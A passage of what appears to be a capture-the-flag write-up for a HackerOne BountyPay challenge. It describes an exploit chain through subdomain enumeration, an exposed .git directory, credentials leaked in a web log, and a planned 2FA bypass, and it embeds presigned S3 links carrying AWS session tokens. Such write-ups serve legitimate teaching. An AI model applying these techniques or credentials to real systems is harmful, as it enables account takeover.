src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/emrHgwaZ5eaKghdsemMuZfUp?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_7.28.31_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_7.28.31_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070628Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=d574e4abe52fc527e65a4ed678efedc21f64c025957728a062533056463c665a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nAs before the CTF started with a tweet from the H1 account - CEO \u003ca href=\"/martenmickos\"\u003e@martenmickos\u003c/a\u003e needs to approve the May bug bounty payments but he lost his credentials for BountyPay - I might be able to help.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003ch3 id=\"summary\"\u003esummary\u003c/h3\u003e\n\n\u003cp\u003eI was able to retrieve the CEO\u0026#39;s account \u0026amp; pay the hackers by using a chain of exploits:\u003c/p\u003e\n\n\u003cp\u003einformation disclosure(github repo) â†’ account takeover(brian.oliver) + 2FA bypass -\u0026gt; ssrf to download private apk â†’ token leaked in apk â†’ account takeover(sandra.allison) + privilege escalation(csrf) â†’ account takeover(marten.mickos) + 2FA bypass\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003epassword:\u003c/strong\u003e h\u0026amp;H5wy2Lggj*kKn4OD\u0026amp;Ype\u003c/p\u003e\n\n\u003ch4 id=\"poc\"\u003ePoC\u003c/h4\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"pwn.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vMYN5m529gvq27oVHfq2E9AG?response-content-disposition=attachment%3B%20filename%3D%22pwn.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwn.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070628Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=0d259d9a8ff193f76382c6a4cd757190359f8a2d6e243f1289bd92857c71001c\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vMYN5m529gvq27oVHfq2E9AG?response-content-disposition=attachment%3B%20filename%3D%22pwn.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwn.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070628Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=0d259d9a8ff193f76382c6a4cd757190359f8a2d6e243f1289bd92857c71001c\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI attached the script in which I automated everything except the android part ðŸ¤–\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003egem \u003cspan class=\"nb\"\u003einstall \u003c/span\u003ehttparty nokogiri colorize\n\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eruby pwn-script.rb\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"pwn-script.rb\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RAdK9JgLxkJPETmEn129s2g4?response-content-disposition=attachment%3B%20filename%3D%22pwn-script.rb%22%3B%20filename%2A%3DUTF-8%27%27pwn-script.rb\u0026amp;response-content-type=text%2Fx-ruby-script\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070628Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=0908f12c858c47483196c150dcf6653db90549e26c0604271cb6bc3f78520fea\" data-attachment-type=\"text/x-ruby-script\"\u003epwn-script.rb (F857598)\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"details\"\u003edetails\u003c/h3\u003e\n\n\u003cp\u003eThere\u0026#39;s a H1 page for the program so let\u0026#39;s check out the scope\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003escope: *.bountypay.h1ctf.com\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThat\u0026#39;s a wide scope - the best thing to do is to start with some subdomain enumeration, let\u0026#39;s see what else is under that \u003ccode\u003ebountypay\u003c/code\u003e subdomain:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=http%3A%2F%2Fapi.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\n\u003cul\u003e\n\u003cli\u003erequires a token\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/redirect?url=\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\n\u003cul\u003e\n\u003cli\u003esign-in portal\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=http%3A%2F%2Fsoftware.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esoftware.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\n\u003cul\u003e\n\u003cli\u003eapk is hosted here\u003c/li\u003e\n\u003cli\u003eonly accessible from known IP\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=http%3A%2F%2Fstaff.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\n\u003cul\u003e\n\u003cli\u003estaff portal\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eAIM\u003c/code\u003e (administrators, regular staff)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=http%3A%2F%2Fapp.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\n\u003cul\u003e\n\u003cli\u003ecustomer portal\u003c/li\u003e\n\u003cli\u003e2 Factor Auth. is enabled\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"foothold\"\u003efoothold\u003c/h3\u003e\n\n\u003cp\u003eAfter going through the subdomains and doing some directory bruteforcing - there was a \u003ccode\u003e403\u003c/code\u003e error that looked promising: \u003ccode\u003eapp.bountypay.h1ctf.com/.git/\u003c/code\u003e, let\u0026#39;s see if someone left some \u003ccode\u003egit\u003c/code\u003e files for us to view.\u003c/p\u003e\n\n\u003cp\u003eIf you hit \u003ccode\u003ehttp://app.bountypay.h1ctf.com/.git/HEAD\u003c/code\u003e you can download the \u003ccode\u003eHEAD\u003c/code\u003e file - now we just need to get something with more information for us, let\u0026#39;s try \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2F.git%2Fconfig\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003ehttps://app.bountypay.h1ctf.com/.git/config\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e This discloses some information:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003ecore]\n    repositoryformatversion \u003cspan class=\"o\"\u003e=\u003c/span\u003e 0\n    filemode \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003etrue\n    \u003c/span\u003ebare \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003efalse\n    \u003c/span\u003elogallrefupdates \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"o\"\u003e[\u003c/span\u003eremote \u003cspan class=\"s2\"\u003e\u0026quot;origin\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n    url \u003cspan class=\"o\"\u003e=\u003c/span\u003e https://github.com/bounty-pay-code/request-logger.git\n    fetch \u003cspan class=\"o\"\u003e=\u003c/span\u003e +refs/heads/\u003cspan class=\"k\"\u003e*\u003c/span\u003e:refs/remotes/origin/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\n\u003cspan class=\"o\"\u003e[\u003c/span\u003ebranch \u003cspan class=\"s2\"\u003e\u0026quot;master\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n    remote \u003cspan class=\"o\"\u003e=\u003c/span\u003e origin\n    merge \u003cspan class=\"o\"\u003e=\u003c/span\u003e refs/heads/master\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis config file discloses a \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbounty-pay-code%2Frequest-logger.git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003egithub\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e repository with some interesting information\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;IP\u0026#39;\u003c/span\u003e        \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REMOTE_ADDR\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;URI\u0026#39;\u003c/span\u003e       \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_URI\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;METHOD\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_METHOD\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;PARAMS\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e   \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_POST\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003efile_put_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;bp_web_trace.log\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003edate\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;U\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ebase64_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003eFILE_APPEND\u003c/span\u003e   \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eA few things to note here:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eApplication uses PHP\u003c/li\u003e\n\u003cli\u003eWrites to a log file that we can access from \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fbp_web_trace.log\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003ehttps://app.bountypay.h1ctf.com/bp_web_trace.log\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in it we can see the following:\n\n\u003cul\u003e\n\u003cli\u003eThe values are encoded using \u003ccode\u003ebase64\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003e\u0026quot;username\u0026quot;:\u0026quot;brian.oliver\u0026quot;,\u003c/li\u003e\n\u003cli\u003e\u0026quot;password\u0026quot;:\u0026quot;V7h0inzX\u0026quot;,\u003c/li\u003e\n\u003cli\u003e\u0026quot;challenge_answer\u0026quot;:\u0026quot;bD83Jk27dQ\u0026quot;\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"app-bountypay-h1ctf-com\"\u003eapp.bountypay.h1ctf.com\u003c/h3\u003e\n\n\u003cp\u003eUsing the \u003ccode\u003eusername/password\u003c/code\u003e works and we can now log into \u003ccode\u003e[app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com)\u003c/code\u003e however...there\u0026#39;s \u003ccode\u003e2 Factor Auth\u003c/code\u003e we\u0026#39;ll need to bypass it.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2020-06-01_at_5.29.03_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YjDL6Ug1BbMLoYzo28yEcHkg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_5.29.03_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_5.29.03_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070628Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=898032064115d525a6b7c6006486945b42f919c7d1f53b881ee49bbbbb7bdf8b\" data-attachment-type=\"image/png\"\u003e\u003cimg 